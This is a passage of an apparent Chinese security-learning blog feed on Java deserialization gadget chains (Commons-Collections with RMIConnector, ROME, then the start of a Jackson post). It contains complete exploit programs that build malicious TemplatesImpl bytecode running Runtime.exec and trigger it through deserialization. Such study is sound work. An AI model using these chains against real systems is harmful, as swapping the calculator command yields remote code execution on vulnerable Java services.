class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(fileBytes);<br><br><br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+base64);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">//        一、cc6前半</span><br><span class="hljs-comment">//        hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;tiedMapEntry.hashcode-&gt;tiedMapEntry.getValue-&gt;lazyMap.get()-&gt;invokerTransformer.Transformer()-&gt;rmiConnector.connect()</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate( new HashMap&lt;&gt;(), new ConstantTransformer(1));</span><br><span class="hljs-comment">//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        expMap.put(tiedMapEntry, &quot;xx&quot;);</span><br><span class="hljs-comment">//        lazyMap.clear();</span><br><span class="hljs-comment">//        setFieldValue(lazyMap,&quot;factory&quot;, invokerTransformer);</span><br><br><span class="hljs-comment">//        二、 cc4.0、PriorityQueue</span><br><span class="hljs-comment">//        PriorityQueue.readObject()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.comparator()-&gt;InvokerTransformer.transformer()</span><br><span class="hljs-comment">//        InvokerTransformer transformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        TransformingComparator comparator = new TransformingComparator(transformer);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        PriorityQueue priorityQueue = new PriorityQueue(1);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;size&quot;,2);</span><br><span class="hljs-comment">//        Object[] objects = &#123;rmiConnector, 1&#125;;</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;queue&quot;,objects);</span><br><span class="hljs-comment">//        setFieldValue(priorityQueue,&quot;comparator&quot;,comparator);</span><br><br><span class="hljs-comment">//     三、 cc3.2.1 cc4  动态代理</span><br><span class="hljs-comment">//        AnnotationInvocationHandler.readObject-&gt;AnnotationInvocationHandler.invoke-&gt;DefaultedMap.get()-&gt;transformerChain.transformer()-&gt;InvokerTransformer.transformer()-&gt;rmiConnector.connect()</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        DefaultedMap&lt;Object, Optional&lt;ConstantTransformer&gt;&gt; defaultedMap =<br>                DefaultedMap.defaultedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)));<br>        setFieldValue(defaultedMap,<span class="hljs-string">&quot;value&quot;</span>, transformerChain);<br><br>        Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; Anotationdeclared =<br>                AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>        Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, defaultedMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Anotationdeclared.newInstance(Override.class,Mapproxy);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">ser2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(ser2);<br>        oos.writeObject(instance);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;RMIC2&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="累了，下次再写。"><a href="#累了，下次再写。" class="headerlink" title="累了，下次再写。"></a>累了，下次再写。</h2><h3 id="佬的剑招"><a href="#佬的剑招" class="headerlink" title="佬的剑招"></a>佬的剑招</h3><p><a href="https://tttang.com/archive/1701/#toc_cc">https://tttang.com/archive/1701/#toc_cc</a></p><p><a href="https://su18.org/">https://su18.org/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rome_gadget</title>
    <link href="/2024/01/15/Rome-gadget/"/>
    <url>/2024/01/15/Rome-gadget/</url>
    
    <content type="html"><![CDATA[<p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。</p><p>ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p><img src="138px-%E7%82%8E%E6%9B%A6%E5%89%91%E6%8B%9B-%E5%A4%A7%E5%9B%BE.jpg" alt="炎曦剑招- 江湖悠悠WIKI_BWIKI_哔哩哔哩"></p><h3 id="0x01-简要分析"><a href="#0x01-简要分析" class="headerlink" title="0x01 简要分析"></a>0x01 简要分析</h3><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;ObjectBean.java</p><p><img src="1705239247603-7fd557c0-dd52-47a5-928d-a93c5eac5dc2.png" alt="img"></p><p>很明显可以想到使用hashmap来触发hashcode，或者BadAttributeValueExpException触发toString()</p><p><img src="1705239596950-31d48e53-7ed3-4520-8a7e-af43f8ba2b10.png" alt="img"></p><p>构造函数可进行赋值。</p><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;EqualsBean.javabeanHashCode()</p><p><img src="1705238212567-4712af84-f22d-4101-8bb2-e1d66d7482c0.png" alt="img"></p><p>可以看到hashcode可以触发javabeanHashCode()方法，进而触发toString方法。<img src="1705238295413-79c2b9b0-e671-4a6f-bcae-e47e8d54a4ba.png" alt="img"></p><p>EqualsBean继承了ser，_obj还是object，通过反射修改。很容易想到json序列化的后半条，或者lazymap的后半条。</p><h3 id="0x02-ToStringBean-java"><a href="#0x02-ToStringBean-java" class="headerlink" title="0x02 ToStringBean.java"></a>0x02 ToStringBean.java</h3><p>com&#x2F;sun&#x2F;syndication&#x2F;feed&#x2F;impl&#x2F;ToStringBean.java#toString()</p><p><img src="1705238851112-2c0572ac-6b8f-4b05-b2d3-af987ebef89a.png" alt="img"></p><p>它会调用同名方法 toString(String prefix)</p><p><img src="1705238945972-1282a106-10de-432c-911a-055ce9b6d6e8.png" alt="img"><img src="1705239021962-2d09ddab-58e0-4774-9ab0-743a7d96bb9d.png" alt="img"></p><p>这个方法会调用 BeanIntrospector.getPropertyDescriptors() 来获取 _beanClass 的全部 getter&#x2F;setter 方法，然后判断参数长度为 0 的方法使用 _obj 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。</p><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>BadAttributeValueExpException.readObject-&gt;rome.ToStringBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-comment">// 读取恶意类 bytes[]</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">AbstractTranslet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;rome1&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 初始化 TemplatesImpl 对象</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-comment">// _name 不能为空</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(tmpl,new TransformerFactoryImpl());</span><br><br><br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, tmpl);<br><span class="hljs-comment">//        ObjectBean root = new ObjectBean(ToStringBean.class, toStringBean);</span><br><br>        <span class="hljs-comment">// 放入 Map 中</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        map.put(root, &quot;test&quot;);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br><span class="hljs-comment">//        Field field = toStringBean.getClass().getDeclaredField(&quot;_obj&quot;);</span><br><span class="hljs-comment">//        field.setAccessible(true);</span><br><span class="hljs-comment">//        field.set(toStringBean,tmpl);</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            outputStream.writeObject(badAttributeValueExpException);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            inputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>hashmap-&gt;rome </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-comment">// 读取恶意类 bytes[]</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">AbstractTranslet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;rome1&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>        payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 初始化 TemplatesImpl 对象</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(tmpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        <span class="hljs-comment">// _name 不能为空</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(tmpl, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(tmpl,new TransformerFactoryImpl());</span><br><br><br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, tmpl);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br><br>        <span class="hljs-comment">// 放入 Map 中</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment">//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Field val = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="hljs-comment">//        val.setAccessible(true);</span><br><span class="hljs-comment">//        val.set(badAttributeValueExpException,delegate);</span><br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br><span class="hljs-comment">//        Field field = toStringBean.getClass().getDeclaredField(&quot;_obj&quot;);</span><br><span class="hljs-comment">//        field.setAccessible(true);</span><br><span class="hljs-comment">//        field.set(toStringBean,tmpl);</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            outputStream.writeObject(map);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./rome&quot;</span>));<br>            inputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上就是 ROME 链分析的全部内容了，最后总结一下。</p><ol><li>利用说明：</li></ol><ul><li><ul><li>利用 HashMap 反序列化触发 ObjectBean 的 hashCode 方法，再触发 ObjectBean 封装的 ObjectBean 的 toString 方法，会调用。</li></ul></li></ul><ol><li>Gadget 总结：</li></ol><ul><li><ul><li>kick-off gadget：java.util.HashMap#readObject()</li><li>sink gadget：com.sun.syndication.feed.impl.ToStringBean#toString()</li><li>chain gadget：com.sun.syndication.feed.impl.ObjectBean#toString()</li></ul></li></ul><ol><li>调用链展示：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">HashMap.readObject()<br>    ObjectBean.hashCode()<br>            EqualsBean.beanHashCode()<br>                    ToStringBean.toString()<br>                        TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><ol><li>依赖版本</li></ol><p>rome : 1.0</p><h3 id="偷学剑招"><a href="#偷学剑招" class="headerlink" title="偷学剑招"></a>偷学剑招</h3><p><a href="https://su18.org/post/ysoserial-su18-5/#objectbean">https://su18.org/post/ysoserial-su18-5/#objectbean</a></p><p><a href="http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/">http://www.bmth666.cn/2022/03/11/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome%E9%93%BE/</a></p><p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/">http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jackson和fastjson原生序列化</title>
    <link href="/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><img src="138px-%E6%9C%9B%E6%9C%88%E5%89%91%E6%B3%95-%E5%A4%A7%E5%9B%BE.jpg" alt="img"></p><h2 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h2><h3 id="0x01-demo"><a href="#0x01-demo" class="headerlink" title="0x01 demo"></a>0x01 demo</h3><p>佬的文章，菜鸟的拿来主义。</p><p>链接</p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 